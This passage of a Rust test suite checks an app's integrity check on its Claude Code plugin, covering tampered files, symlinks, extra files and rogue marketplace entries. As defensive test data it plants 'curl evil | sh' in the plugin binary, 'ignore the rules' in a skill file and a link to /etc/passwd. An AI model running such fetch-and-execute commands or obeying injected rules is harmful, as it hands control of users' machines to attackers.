    let dir = tempfile::tempdir().unwrap();
    let elsewhere = dir.path().join("elsewhere");
    fs::create_dir_all(&elsewhere).unwrap();
    fs::write(elsewhere.join("run.sh"), "evil").unwrap();
    let fresh = || {
        let plugin = tempfile::tempdir().unwrap();
        plant_plugin(plugin.path());
        plugin
    };
    // A link to a folder, to nowhere, and to the shipped files' own text: none is a file or folder of ours.
    let plugin = fresh();
    symlink(&elsewhere, plugin.path().join("skills/other")).unwrap();
    assert!(difference(plugin.path()).is_some_and(|why| why.contains("skills/other")), "a folder link");
    let plugin = fresh();
    symlink("/nowhere", plugin.path().join("commands")).unwrap();
    assert!(difference(plugin.path()).is_some_and(|why| why.contains("commands")), "a link to nowhere");
    let plugin = fresh();
    symlink(&elsewhere, plugin.path().join(".orphaned_at")).unwrap();
    assert!(difference(plugin.path()).is_some_and(|why| why.contains(".orphaned_at")), "a marker that is a link");
    // A shipped file replaced by a link to a copy of it, and a shipped folder replaced by a link to a folder.
    let plugin = fresh();
    fs::copy(plugin.path().join("bin/na"), elsewhere.join("na")).unwrap();
    fs::remove_file(plugin.path().join("bin/na")).unwrap();
    symlink(elsewhere.join("na"), plugin.path().join("bin/na")).unwrap();
    assert!(difference(plugin.path()).is_some_and(|why| why.contains("bin/na")), "a link with the right text");
    let plugin = fresh();
    fs::remove_dir_all(plugin.path().join("hooks")).unwrap();
    symlink(&elsewhere, plugin.path().join("hooks")).unwrap();
    assert!(difference(plugin.path()).is_some(), "a folder that is a link");
    // Nothing is followed down a loop.
    let plugin = fresh();
    symlink(plugin.path(), plugin.path().join("bin/loop")).unwrap();
    assert!(difference(plugin.path()).is_some_and(|why| why.contains("bin/loop")));
}

#[test]
fn a_download_with_something_extra_is_removed_and_the_person_is_told() {
    let lab = Lab::with_claude();
    let dir = install_dir(&lab, "0.4.0");
    plant_plugin(&dir);
    fs::write(dir.join(".mcp.json"), "{}").unwrap();
    assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), MISMATCH);
    let calls = lab.calls();
    assert_eq!(
        calls[calls.len() - 2..],
        ["plugin uninstall grade@noactually -y", "plugin marketplace remove noactually"]
    );
}

#[test]
fn the_plugin_list_says_where_the_files_are_and_nothing_else_does() {
    let lab = Lab::with_claude();
    let elsewhere = lab.dir.path().join("somewhere/else");
    plant_plugin(&elsewhere);
    fs::write(elsewhere.join("hooks/hooks.json"), "{}").unwrap();
    // A matching copy in Claude Code's own cache must not stand in for the one the list names.
    plant_plugin(&lab.env.home.join(".claude/plugins/cache/noactually/grade/0.4.0"));
    lab.fake(
        "plugins.json",
        &format!(r#"[{{"id":"grade@noactually","version":"0.4.0","installPath":{}}}]"#, serde_json::json!(elsewhere)),
    );
    assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), MISMATCH);
    // `path` is read too, and a good copy there passes.
    let lab = Lab::with_claude();
    let good = lab.dir.path().join("good");
    plant_plugin(&good);
    lab.fake("plugins.json", &format!(r#"[{{"id":"grade@noactually","path":{}}}]"#, serde_json::json!(good)));
    claude_on(&lab, SOURCE).unwrap();
}

#[test]
fn without_an_install_path_the_plugin_is_unverified_and_kept() {
    // The list names no folder. Claude Code's cache has a bad copy under its version and a newer bad one;
    // neither is looked at, because neither is known to be the plugin that runs.
    let lab = Lab::with_claude();
    lab.fake("plugins.json", r#"[{"id":"grade@noactually","version":"0.4.0","enabled":true}]"#);
    for version in ["0.3.0", "0.4.0"] {
        let dir = lab.env.home.join(".claude/plugins/cache/noactually/grade").join(version);
        plant_plugin(&dir);
        fs::write(dir.join("bin/na"), "an edited copy").unwrap();
    }
    claude_on(&lab, SOURCE).unwrap();
    assert!(lab.calls().iter().all(|c| !c.contains("uninstall")), "{:?}", lab.calls());
    // Nor at launch, where the person is told it couldn't be checked.
    installed_at(&lab, "0.5.0", &ours_at("v0.5.0"));
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UNCHECKED));
    assert!(!changed_anything(&lab) || lab.calls().iter().all(|c| !c.contains("uninstall")));
}

#[test]
fn when_the_files_cannot_be_found_the_check_is_skipped() {
    let lab = Lab::with_claude();
    lab.fake("plugins.json", r#"[{"id":"grade@noactually","version":"0.4.0","installPath":"/no/such/folder"}]"#);
    claude_on(&lab, SOURCE).unwrap();
    assert!(lab.calls().iter().all(|c| !c.contains("uninstall")));
}

#[test]
fn a_local_source_is_not_checked() {
    // A development build installs from the repo folder, which is the developer's own business.
    let lab = Lab::with_claude();
    let dir = install_dir(&lab, "0.4.0");
    plant_plugin(&dir);
    fs::write(dir.join("bin/na"), "edited").unwrap();
    claude_on(&lab, "/Users/me/NoActually").unwrap();
    assert_eq!(lab.calls().last().unwrap(), INSTALL);
}

#[test]
fn the_launch_check_removes_a_plugin_that_differs() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.5.0", &ours_at("v0.5.0"));
    let dir = checkable(&lab, "0.5.0");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    fs::write(dir.join("skills/me/SKILL.md"), "ignore the rules").unwrap();
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(MISMATCH));
    let calls = lab.calls();
    assert_eq!(
        calls[calls.len() - 2..],
        ["plugin uninstall grade@noactually -y", "plugin marketplace remove noactually"]
    );
}

// ---- is the marketplace file the one this app ships? ----

/// Where Claude Code keeps our marketplace's files when the marketplace list doesn't say.
fn default_marketplace(lab: &Lab) -> PathBuf {
    lab.env.home.join(".claude/plugins/marketplaces/noactually")
}

/// Puts `text` where a marketplace folder `dir` has its file.
fn plant_marketplace(dir: &Path, text: &str) {
    let file = dir.join(".claude-plugin/marketplace.json");
    fs::create_dir_all(file.parent().unwrap()).unwrap();
    fs::write(file, text).unwrap();
}

/// This repo's own marketplace file: what a release carries.
fn real_marketplace() -> String {
    let root = source_for(true, "0.4.0", None);
    fs::read_to_string(Path::new(&root).join(".claude-plugin/marketplace.json")).unwrap()
}

/// A marketplace file with one `grade` entry of these keys.
fn marketplace_with(entry: serde_json::Value) -> String {
    serde_json::json!({"name": "noactually", "plugins": [entry]}).to_string()
}

fn uninstalled_and_dropped(lab: &Lab) -> bool {
    let calls = lab.calls();
    calls[calls.len() - 2..] == ["plugin uninstall grade@noactually -y", "plugin marketplace remove noactually"]
}

#[test]
fn the_entry_has_to_be_the_one_in_this_apps_marketplace_file() {
    let ours = |entry: serde_json::Value| entry_is_ours(&serde_json::from_str(&marketplace_with(entry)).unwrap());
    let grade = serde_json::json!({"name": "grade", "source": "./plugins/grade", "description": "Report cards."});
    let with = |key: &str, value: serde_json::Value| {
        let mut entry = grade.clone();
        entry[key] = value;
        entry
    };
    let without = |key: &str| {
        let mut entry = grade.clone();
        entry.as_object_mut().unwrap().remove(key);
        entry
    };
    // What this repo ships passes, and so does the same entry with a version.
    assert!(entry_is_ours(&serde_json::from_str(&real_marketplace()).unwrap()), "{}", real_marketplace());
    assert!(ours(grade.clone()));
    assert!(ours(with("version", "0.4.0".into())));
    assert!(ours(with("description", "Something else.".into())), "the words don't matter");

    // Any other key can carry something to run; the source has to be exactly the folder in this repo.
    for key in
        ["hooks", "mcpServers", "commands", "agents", "skills", "lspServers", "monitors", "strict", "category", "tags"]
    {
        assert!(!ours(with(key, serde_json::json!({}))), "{key}");
    }
    for source in
        ["./plugins/other", "plugins/grade", "./plugins/grade/", "./plugins/Grade", "../grade", "/tmp/grade", ""]
    {
        assert!(!ours(with("source", source.into())), "{source}");
    }
    for source in [
        serde_json::json!({"source": "github", "repo": "someone/evil"}),
        serde_json::json!({"source": "url", "url": "https://example.com/x.git"}),
        serde_json::json!(["./plugins/grade"]),
        serde_json::json!(null),
    ] {
        assert!(!ours(with("source", source.clone())), "{source}");
    }
    assert!(!ours(without("source")) && !ours(without("description")) && !ours(without("name")));
    assert!(!ours(with("description", serde_json::json!({}))) && !ours(with("version", serde_json::json!(4))));

    // One entry named `grade`, no more and no fewer; entries for other plugins are no business of ours.
    let parse = |text: &str| serde_json::from_str::<serde_json::Value>(text).unwrap();
    let (good, bad) = (grade.clone(), with("hooks", serde_json::json!({})));
    let list = |plugins: &[&serde_json::Value]| parse(&serde_json::json!({"plugins": plugins}).to_string());
    assert!(entry_is_ours(&list(&[
        &good,
        &serde_json::json!({"name": "other", "source": "https://x/y", "hooks": {}})
    ])));
    assert!(!entry_is_ours(&list(&[&good, &bad])), "a second entry of that name, a bad one");
    assert!(!entry_is_ours(&list(&[&bad, &good])));
    assert!(!entry_is_ours(&list(&[&good, &good])), "or a good one");
    assert!(!entry_is_ours(&list(&[])) && !entry_is_ours(&list(&[&serde_json::json!({"name": "Grade"})])));
    assert!(!entry_is_ours(&list(&[&serde_json::json!("grade")])), "an entry that is not an object");
    for not_a_marketplace in
        ["{}", "[]", "null", r#"{"plugins": {}}"#, r#"{"plugins": "grade"}"#, r#"{"plugins": null}"#]
    {
        assert!(!entry_is_ours(&parse(not_a_marketplace)), "{not_a_marketplace}");
    }
}

#[test]
fn a_download_whose_marketplace_file_is_this_apps_is_kept() {
    let lab = Lab::with_claude();
    plant_marketplace(&default_marketplace(&lab), &real_marketplace());
    plant_plugin(&install_dir(&lab, "0.4.0"));
    claude_on(&lab, SOURCE).unwrap();
    assert!(lab.calls().iter().all(|c| !c.contains("uninstall")), "{:?}", lab.calls());
}

#[test]
fn a_download_whose_marketplace_file_lists_more_is_removed_and_the_person_is_told() {
    let grade = serde_json::json!({"name": "grade", "source": "./plugins/grade", "description": "Report cards."});
    let extra = |key: &str, value: serde_json::Value| {
        let mut entry = grade.clone();
        entry[key] = value;
        marketplace_with(entry)
    };
    for (what, text) in [
        ("a hook of its own", extra("hooks", serde_json::json!({"Stop": []}))),
        ("a server", extra("mcpServers", serde_json::json!({"x": {"command": "sh"}}))),
        ("another source", extra("source", "./plugins/other".into())),
        ("a source elsewhere", extra("source", serde_json::json!({"source": "github", "repo": "a/b"}))),
        ("no grade entry", marketplace_with(serde_json::json!({"name": "other", "source": "./plugins/grade"}))),
        ("a second grade entry", serde_json::json!({"plugins": [grade, grade]}).to_string()),
        ("not JSON", "<<<<<<< HEAD".into()),
        ("an empty file", String::new()),
        ("a different shape", r#"["grade"]"#.into()),
        ("too much", format!("{}{}", real_marketplace(), " ".repeat(1 << 17))),
    ] {
        let lab = Lab::with_claude();
        plant_marketplace(&default_marketplace(&lab), &text);
        plant_plugin(&install_dir(&lab, "0.4.0"));
        assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), MISMATCH, "{what}");
        assert!(uninstalled_and_dropped(&lab), "{what}: {:?}", lab.calls());
    }
}

#[test]
fn the_marketplace_file_is_where_the_list_says_else_where_claude_code_puts_it() {
    let bad = marketplace_with(
        serde_json::json!({"name": "grade", "source": "./plugins/grade", "description": "x", "hooks": {}}),
    );
    // The list names a folder: that one is looked at, whatever the usual one holds.
    for (said, key) in [("installLocation", 0), ("install_location", 1)] {
        let lab = Lab::with_claude();
        let named = lab.dir.path().join(format!("named-{key}"));
        let market = |tag: &str| {
            let mut m = serde_json::from_str::<serde_json::Value>(&ours_at(tag)).unwrap();
            m[0][said] = serde_json::json!(named);
            m.to_string()
        };
        lab.fake("marketplaces.json", &market("v0.4.0"));
        plant_plugin(&install_dir(&lab, "0.4.0"));
        plant_marketplace(&default_marketplace(&lab), &real_marketplace());
        plant_marketplace(&named, &bad);
        assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), MISMATCH, "{said}: a bad one named, a good one usual");
        assert!(uninstalled_and_dropped(&lab));

        let lab = Lab::with_claude();
        lab.fake("marketplaces.json", &market("v0.4.0"));
        plant_plugin(&install_dir(&lab, "0.4.0"));
        plant_marketplace(&default_marketplace(&lab), &bad);
        plant_marketplace(&named, &real_marketplace());
        claude_on(&lab, SOURCE).unwrap();
        assert!(lab.calls().iter().all(|c| !c.contains("uninstall")), "{said}: a good one named, a bad one usual");

        // A folder that has no file in it is not a reason to look elsewhere.
        let lab = Lab::with_claude();
        lab.fake("marketplaces.json", &market("v0.4.0"));
        plant_plugin(&install_dir(&lab, "0.4.0"));
        plant_marketplace(&default_marketplace(&lab), &bad);
        claude_on(&lab, SOURCE).unwrap();
        assert!(lab.calls().iter().all(|c| !c.contains("uninstall")), "{said}: nothing in the named folder");
    }
    // A list without it (or a blank one) falls back to the usual folder.
    let lab = Lab::with_claude();
    lab.fake(
        "marketplaces.json",
        r#"[{"name":"noactually","source":"github","repo":"HTMLGuyLLC/NoActually","installLocation":""}]"#,
    );
    plant_plugin(&install_dir(&lab, "0.4.0"));
    plant_marketplace(&default_marketplace(&lab), &bad);
    assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), MISMATCH);
}

#[test]
fn a_marketplace_file_that_cannot_be_found_is_unverified_and_kept() {
    let lab = Lab::with_claude();
    plant_plugin(&install_dir(&lab, "0.4.0"));
    claude_on(&lab, SOURCE).unwrap();
    assert!(lab.calls().iter().all(|c| !c.contains("uninstall")), "{:?}", lab.calls());
    // A folder with no `.claude-plugin` in it, too.
    fs::create_dir_all(default_marketplace(&lab)).unwrap();
    claude_on(&lab, SOURCE).unwrap();
    assert!(lab.calls().iter().all(|c| !c.contains("uninstall")), "{:?}", lab.calls());
    // And at launch.
    let lab = Lab::with_claude();
    installed_at(&lab, "0.5.0", &ours_at("v0.5.0"));
    plant_plugin(&install_dir(&lab, "0.5.0"));
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UNCHECKED));
    assert!(!changed_anything(&lab), "{:?}", lab.calls());
}

#[test]
fn a_marketplace_file_that_is_there_but_not_a_plain_file_is_a_difference() {
    let lab = Lab::with_claude();
    plant_plugin(&install_dir(&lab, "0.4.0"));
    fs::create_dir_all(default_marketplace(&lab).join(".claude-plugin/marketplace.json")).unwrap();
    assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), MISMATCH, "a folder");
    #[cfg(unix)]
    {
        // A link to a good copy still isn't the file the clone holds.
        let lab = Lab::with_claude();
        plant_plugin(&install_dir(&lab, "0.4.0"));
        let good = lab.dir.path().join("good.json");
        fs::write(&good, real_marketplace()).unwrap();
        let file = default_marketplace(&lab).join(".claude-plugin/marketplace.json");
        fs::create_dir_all(file.parent().unwrap()).unwrap();
        std::os::unix::fs::symlink(&good, &file).unwrap();
        assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), MISMATCH, "a link");
        assert!(uninstalled_and_dropped(&lab));
    }
}

#[test]
fn the_marketplace_file_is_not_checked_for_a_local_source() {
    // A development build installs from the repo folder, which is the developer's own business.
    let lab = Lab::with_claude();
    plant_plugin(&install_dir(&lab, "0.4.0"));
    plant_marketplace(&default_marketplace(&lab), r#"{"plugins":[{"name":"grade","source":"./x","hooks":{}}]}"#);
    claude_on(&lab, "/Users/me/NoActually").unwrap();
    assert_eq!(lab.calls().last().unwrap(), INSTALL);
}

#[test]
fn the_launch_check_removes_a_plugin_whose_marketplace_file_differs() {
    let bad = marketplace_with(
        serde_json::json!({"name": "grade", "source": "./plugins/grade", "description": "x", "commands": "./evil"}),
    );
    let lab = Lab::with_claude();
    installed_at(&lab, "0.5.0", &ours_at("v0.5.0"));
    plant_plugin(&install_dir(&lab, "0.5.0"));
    plant_marketplace(&default_marketplace(&lab), &real_marketplace());
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    assert!(!changed_anything(&lab), "{:?}", lab.calls());
    plant_marketplace(&default_marketplace(&lab), &bad);
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(MISMATCH));
    assert!(uninstalled_and_dropped(&lab), "{:?}", lab.calls());
    // Not for a marketplace of ours at some other source: that one is not ours to judge.
    let lab = Lab::with_claude();
    installed_at(&lab, "0.5.0", r#"[{"name":"noactually","source":"github","repo":"HTMLGuyLLC/NoActually"}]"#);
    plant_plugin(&install_dir(&lab, "0.5.0"));
    plant_marketplace(&default_marketplace(&lab), &bad);
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    assert!(!changed_anything(&lab));
}

#[test]
fn the_launch_check_leaves_a_plugin_from_another_marketplace_source_alone_whatever_it_holds() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.5.0", r#"[{"name":"noactually","source":"github","repo":"HTMLGuyLLC/NoActually"}]"#);
    let dir = install_dir(&lab, "0.5.0");
    plant_plugin(&dir);
    fs::write(dir.join("skills/me/SKILL.md"), "a newer one from main").unwrap();
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    assert!(!changed_anything(&lab));
}

// ---- looking for the new tag first, extra files, and problems that stay ----

const LS_REMOTE: &str = "ls-remote https://github.com/HTMLGuyLLC/NoActually.git refs/tags/v0.5.0";

#[test]
fn the_new_tag_is_looked_for_with_git_before_the_move_and_found() {
    let mut lab = Lab::with_claude();
    lab.add_git();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    checkable(&lab, "0.5.0");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved);
    assert_eq!(lab.git_calls(), [LS_REMOTE], "read-only, and only the one tag");
    // A computer with no git skips the look, and the move goes ahead as before.
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    checkable(&lab, "0.5.0");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved);
    assert_eq!(lab.git_calls(), Vec::<String>::new());
}

#[test]
fn a_tag_that_cannot_be_reached_keeps_the_plugin_and_waits_for_the_next_launch() {
    // `no-tag`: the remote answers, and doesn't have it. `fail-git`: no connection.
    for why in ["no-tag", "fail-git"] {
        let mut lab = Lab::with_claude();
        lab.add_git();
        installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
        checkable(&lab, "0.5.0");
        lab.fake(why, "");
        assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UPDATE_FAILED), "{why}");
        assert_eq!(lab.git_calls(), [LS_REMOTE], "{why}");
        assert!(!changed_anything(&lab), "{why}: the marketplace and the plugin are as they were: {:?}", lab.calls());
        // The note says the old plugin is in place, so Settings says the update failed and the hourly retry rests.
        assert_eq!(waiting(&lab), Some(serde_json::json!({"pin": "v0.4.0", "disabled": false, "restored": true})));
        let shown = status(&lab.env, &[], None).claude_code;
        assert!(shown.on, "{why}");
        assert_eq!(shown.problem.as_deref(), Some(UPDATE_FAILED), "{why}");
        let calls = lab.calls().len();
        assert!(super::claude::retry_pending(&lab.env, "0.5.0").is_none(), "{why}");
        assert_eq!(lab.calls().len(), calls, "{why}: not so much as a look");
        // The next launch looks again, and goes ahead once the tag is there.
        fs::remove_file(lab.bin().join(why)).unwrap();
        assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Moved, "{why}");
        assert_eq!(waiting(&lab), None);
    }
}

#[test]
fn a_tag_that_cannot_be_reached_leaves_a_note_that_was_there_as_it_was() {
    // The plugin was lost by an earlier move: the note must keep sending the next launch and the hourly retry after it.
    let mut lab = Lab::with_claude();
    lab.add_git();
    lab.fake("no-tag", "");
    lab.fake("marketplaces.json", &ours_at("v0.4.0"));
    fs::write(lab.env.repin_file(), r#"{"pin":"v0.4.0"}"#).unwrap();
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UPDATE_FAILED));
    assert!(!changed_anything(&lab), "{:?}", lab.calls());
    assert_eq!(waiting(&lab), Some(serde_json::json!({"pin": "v0.4.0"})));
    assert!(super::claude::retry_pending(&lab.env, "0.5.0").is_some(), "the plugin is gone, so it is tried hourly");
}

#[test]
fn a_move_that_lost_the_plugin_is_still_tried_every_hour() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.4.0", &ours_at("v0.4.0"));
    lab.fake("fail-when", "plugin install");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UPDATE_FAILED));
    assert_eq!(waiting(&lab), Some(serde_json::json!({"pin": "v0.4.0", "disabled": false, "restored": false})));
    fs::remove_file(lab.bin().join("fail-when")).unwrap();
    lab.fake("marketplaces.json", "[]");
    let retried = check_plugin(|| Ok(lab.env_copy()), "0.5.0", true);
    assert!(matches!(retried, Ok(Some(Launch::Moved))), "{retried:?}");
    assert_eq!(waiting(&lab), None);
}

/// The extra file at launch, in a plugin whose own files are all there and the same.
fn plugin_with_extra(extra: &str) -> (Lab, PathBuf) {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.5.0", &ours_at("v0.5.0"));
    let dir = checkable(&lab, "0.5.0");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine);
    let path = dir.join(extra);
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(&path, "{}").unwrap();
    (lab, dir)
}

#[test]
fn at_launch_a_plugin_with_only_extra_files_is_switched_off_not_removed() {
    for extra in ["monitors/monitors.json", "settings.json", "hooks/extra.json", ".mcp.json", "future/new.file"] {
        let (lab, dir) = plugin_with_extra(extra);
        assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(EXTRA_FILES), "{extra}");
        assert_eq!(EXTRA_FILES, "The report card plugin has files this app didn't put there, so it was switched off.");
        let calls = lab.calls();
        assert_eq!(calls.last().unwrap(), DISABLE, "{extra}: it must not stay on");
        assert!(calls.iter().all(|c| !c.contains("uninstall") && !c.contains("marketplace remove")), "{calls:?}");
        // The reason stays beside the database, so Settings says it after a restart too.
        assert_eq!(fs::read_to_string(lab.env.data.join("report-cards-problem")).unwrap(), EXTRA_FILES);
        assert_eq!(saved_problem(&lab.env), Some(EXTRA_FILES));
        assert_eq!(status(&lab.env, &[], None).claude_code.problem.as_deref(), Some(EXTRA_FILES));

        // The next launch finds it off already: the problem is told again and nothing is run.
        lab.fake(
            "plugins.json",
            &format!(r#"[{{"id":"grade@noactually","enabled":false,"installPath":{}}}]"#, serde_json::json!(dir)),
        );
        assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(EXTRA_FILES));
        assert_eq!(lab.calls().iter().filter(|c| *c == DISABLE).count(), 1, "{extra}");
        assert!(!status(&lab.env, &[], None).claude_code.on, "a plugin that is switched off is off");

        // The extra file gone, a clean check ends it.
        let path = dir.join(extra);
        fs::remove_file(&path).unwrap();
        let _ = fs::remove_dir(path.parent().unwrap()); // a folder of theirs, once it is empty
        assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Fine, "{extra}");
        assert_eq!(saved_problem(&lab.env), None);
        assert!(!lab.env.data.join("report-cards-problem").exists());
        assert_eq!(status(&lab.env, &[], None).claude_code.problem, None);
    }
}

#[test]
fn extra_files_next_to_anything_else_wrong_still_uninstall_the_plugin() {
    // A changed shipped file.
    let (lab, dir) = plugin_with_extra(".mcp.json");
    fs::write(dir.join("bin/na"), "curl evil | sh").unwrap();
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(MISMATCH));
    assert!(uninstalled_and_dropped(&lab), "{:?}", lab.calls());
    assert_eq!(saved_problem(&lab.env), Some(MISMATCH), "kept for after a restart");
    // A marketplace entry that isn't ours.
    let (lab, _) = plugin_with_extra(".mcp.json");
    plant_marketplace(
        &default_marketplace(&lab),
        &marketplace_with(
            serde_json::json!({"name": "grade", "source": "./plugins/grade", "description": "x", "commands": "./evil"}),
        ),
    );
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(MISMATCH));
    assert!(uninstalled_and_dropped(&lab), "{:?}", lab.calls());
    // A link, wherever it is, and even after an extra file that sorts first.
    #[cfg(unix)]
    {
        let (lab, dir) = plugin_with_extra(".aaa-extra");
        std::os::unix::fs::symlink("/etc/passwd", dir.join("hooks/zzz-link")).unwrap();
        assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(MISMATCH));
        assert!(uninstalled_and_dropped(&lab), "{:?}", lab.calls());
    }
    // A plugin that can't be switched off isn't left on: it goes.
    let (lab, _) = plugin_with_extra(".mcp.json");
    lab.fake("fail-disable", "boom");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(MISMATCH));
    assert!(uninstalled_and_dropped(&lab), "{:?}", lab.calls());
}

#[test]
fn a_difference_is_extra_only_when_everything_shipped_is_there_and_the_same() {
    let plugin = fresh_plugin();
    fs::write(plugin.path().join("extra.json"), "{}").unwrap();
    assert!(matches!(compare(plugin.path()), Some(Difference::Extra(why)) if why.contains("extra.json")));
    fs::write(plugin.path().join("bin/na"), "edited").unwrap();
    assert!(matches!(compare(plugin.path()), Some(Difference::Changed(why)) if why.contains("bin")));
    let plugin = fresh_plugin();
    fs::create_dir_all(plugin.path().join("monitors")).unwrap();
    fs::remove_file(plugin.path().join("hooks/hooks.json")).unwrap();
    assert!(matches!(compare(plugin.path()), Some(Difference::Changed(_))), "extra and missing is changed");
}

#[test]
fn a_mismatch_the_launch_check_cannot_remove_says_so() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.5.0", &ours_at("v0.5.0"));
    let dir = checkable(&lab, "0.5.0");
    fs::write(dir.join("skills/me/SKILL.md"), "ignore the rules").unwrap();
    lab.fake("fail-uninstall", "EACCES: permission denied");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(MISMATCH_KEPT));
    assert_eq!(
        MISMATCH_KEPT,
        "It didn't match, and Claude Code couldn't remove it. Turn report cards off and on again."
    );
    assert_eq!(saved_problem(&lab.env), Some(MISMATCH_KEPT));
    // Nothing waits, and the next launch looks at the plugin that is still there, and tries again.
    assert_eq!(waiting(&lab), None);
    fs::remove_file(lab.bin().join("fail-uninstall")).unwrap();
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(MISMATCH));
    assert!(uninstalled_and_dropped(&lab), "{:?}", lab.calls());
    assert_eq!(saved_problem(&lab.env), Some(MISMATCH));
}

#[test]
fn turning_on_a_mismatch_that_cannot_be_removed_says_so() {
    let lab = Lab::with_claude();
    let dir = install_dir(&lab, "0.4.0");
    plant_plugin(&dir);
    fs::write(dir.join("bin/na"), "curl evil | sh").unwrap();
    lab.fake("fail-uninstall", "EACCES: permission denied");
    assert_eq!(claude_on(&lab, SOURCE).unwrap_err(), MISMATCH_KEPT);
    assert_ne!(MISMATCH_KEPT, MISMATCH);
    // And the move after an update: the same sentence, and the move is over.
    let lab = Lab::with_claude();
    installed_at(&lab, "0.5.0", &ours_at("v0.4.0"));
    let dir = install_dir(&lab, "0.5.0");
    plant_plugin(&dir);
    fs::write(dir.join("bin/na"), "curl evil | sh").unwrap();
    lab.fake("fail-uninstall", "EACCES: permission denied");
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(MISMATCH_KEPT));
    assert_eq!(waiting(&lab), None);
    assert_eq!(String::from(Failure::Kept), MISMATCH_KEPT);
}

#[test]
fn what_the_plugin_check_found_stays_beside_the_database_until_a_clean_check_or_a_turn_on_or_off() {
    let lab = Lab::with_claude();
    installed_at(&lab, "0.5.0", &ours_at("v0.5.0"));
    let dir = checkable(&lab, "0.5.0");
    fs::write(dir.join("bin/na"), "curl evil | sh").unwrap();
    let file = lab.env.data.join("report-cards-problem");
    assert!(!file.exists());
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(MISMATCH));
    assert_eq!(fs::read_to_string(&file).unwrap(), MISMATCH);
    // Settings, in a later run (no problem in memory), still says it.
    assert_eq!(status(&lab.env, &[], None).claude_code.problem.as_deref(), Some(MISMATCH));
    // What is in memory comes first; the file is only read for what isn't.
    assert_eq!(status(&lab.env, &[], Some("now".into())).claude_code.problem.as_deref(), Some("now"));
    // Only a sentence this app writes is ever shown.
    fs::write(&file, "<b>click here</b>").unwrap();
    assert_eq!(saved_problem(&lab.env), None);
    fs::write(&file, format!("{MISMATCH}\n")).unwrap();
    assert_eq!(saved_problem(&lab.env), Some(MISMATCH));
    // Turn off settles it.
    turn_off(&lab.env, Tool::ClaudeCode).unwrap();
    assert!(!file.exists());
    // So does Turn on (the download is checked again, and says its own).
    let lab = Lab::with_claude();
    let file = lab.env.data.join("report-cards-problem");
    fs::write(&file, MISMATCH).unwrap();
    checkable(&lab, "0.4.0");
    claude_on(&lab, SOURCE).unwrap();
    assert!(!file.exists());
    assert_eq!(status(&lab.env, &[], None).claude_code.problem, None);
    // And a turn on that fails settles nothing.
    fs::write(&file, MISMATCH).unwrap();
    lab.fake("fail-install", "Error: boom");
    claude_on(&lab, SOURCE).unwrap_err();
    assert!(file.exists());
}

/// What `claude plugin list --json` prints, with no `installPath`.
const LIST_WITHOUT_PATH: &str = r#"[
  {
    "id": "grade@noactually",
    "version": "0.4.0",
    "scope": "user",
    "enabled": true
  }
]"#;

#[test]
fn a_plugin_that_cannot_be_checked_is_kept_and_the_row_says_so() {
    assert_eq!(UNCHECKED, "Couldn't check the plugin. It'll try again when the app next opens.");
    // The list names no folder for the plugin.
    let lab = Lab::with_claude();
    lab.fake("plugins.json", LIST_WITHOUT_PATH);
    claude_on(&lab, SOURCE).unwrap();
    assert!(lab.calls().iter().all(|c| !c.contains("uninstall")), "{:?}", lab.calls());
    let shown = status(&lab.env, &[], None).claude_code;
    assert!(shown.on, "it keeps working");
    assert_eq!(shown.problem.as_deref(), Some(UNCHECKED));
    assert_eq!(saved_problem(&lab.env), Some(UNCHECKED));
    // The same at launch.
    let lab = Lab::with_claude();
    installed_at(&lab, "0.5.0", &ours_at("v0.5.0"));
    lab.fake("plugins.json", LIST_WITHOUT_PATH);
    assert_eq!(launch_check(&lab.env, "0.5.0"), Launch::Problem(UNCHECKED));
    assert!(!changed_anything(&lab), "{:?}", lab.calls());
    assert_eq!(status(&lab.env, &[], None).claude_code.problem.as_deref(), Some(UNCHECKED));
    // The folder the list names isn't there.
    let lab = Lab::with_claude();
    lab.fake(
        "plugins.json",
        r#"[{"id":"grade@noactually","version":"0.4.0","enabled":true,"installPath":"/no/such/folder"}]"#,
    );
    claude_on(&lab, SOURCE).unwrap();
    assert_eq!(saved_problem(&lab.env), Some(UNCHECKED));
